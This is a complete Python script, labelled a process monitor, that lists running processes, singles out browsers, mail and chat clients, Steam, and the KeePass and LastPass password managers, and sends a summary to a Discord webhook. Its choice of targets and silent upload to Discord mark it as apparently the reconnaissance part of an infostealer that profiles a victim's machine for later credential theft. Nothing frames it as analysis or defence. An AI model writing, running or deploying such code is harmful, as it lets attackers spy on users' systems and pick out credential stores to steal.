#!/usr/bin/env python3
"""
Process Monitor
Monitors running processes and sends list to Discord
"""

import sys
import os
from datetime import datetime

# Add parent directory to path
sys.path.insert(0, os.path.dirname(__file__))
try:
    from webhook_utils import send_to_discord
    WEBHOOK_AVAILABLE = True
except ImportError:
    WEBHOOK_AVAILABLE = False

def get_running_processes():
    """Get list of running processes"""
    processes = []
    
    try:
        import psutil
        
        for proc in psutil.process_iter(['pid', 'name', 'username']):
            try:
                pinfo = proc.info
                processes.append({
                    'pid': pinfo['pid'],
                    'name': pinfo['name'],
                    'user': pinfo.get('username', 'N/A')
                })
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        
        return processes
        
    except ImportError:
        print("ERROR: psutil not installed")
        print("Install with: pip install psutil")
        return []

def main():
    print("=" * 60)
    print("PROCESS MONITOR")
    print("=" * 60)
    
    print("\nGathering process information...")
    processes = get_running_processes()
    
    if not processes:
        print("No processes found or psutil not installed.")
        return
    
    print(f"\nFound {len(processes)} running processes\n")
    
    # Show interesting processes
    interesting = ['chrome', 'firefox', 'outlook', 'discord', 'telegram', 
                  'keepass', 'lastpass', 'steam', 'explorer']
    
    print("Interesting processes found:")
    found_interesting = []
    
    for proc in processes:
        proc_name_lower = proc['name'].lower()
        for interesting_name in interesting:
            if interesting_name in proc_name_lower:
                found_interesting.append(proc)
                print(f"  • {proc['name']} (PID: {proc['pid']})")
                break
    
    if not found_interesting:
        print("  (None)")
    
    # Send to Discord
    if WEBHOOK_AVAILABLE:
        print("\nSending process list to Discord...")
        
        message = f"**Process Monitor Report**\n\n"
        message += f"📊 **Total Processes:** {len(processes)}\n"
        message += f"🎯 **Interesting Processes:** {len(found_interesting)}\n\n"
        
        if found_interesting:
            message += "**Notable processes:**\n"
            for proc in found_interesting[:15]:
                message += f"• `{proc['name']}` (PID: {proc['pid']})\n"
        
        # Top processes by name
        from collections import Counter
        proc_names = [p['name'] for p in processes]
        top_procs = Counter(proc_names).most_common(10)
        
        message += "\n**Most common processes:**\n"
        for name, count in top_procs:
            message += f"• {name} ({count} instances)\n"
        
        success = send_to_discord("Process Monitor", message)
        
        if success:
            print("✓ Data sent to Discord")
        else:
            print("✗ Failed to send to Discord")
    
    print("=" * 60)

if __name__ == "__main__":
    main()
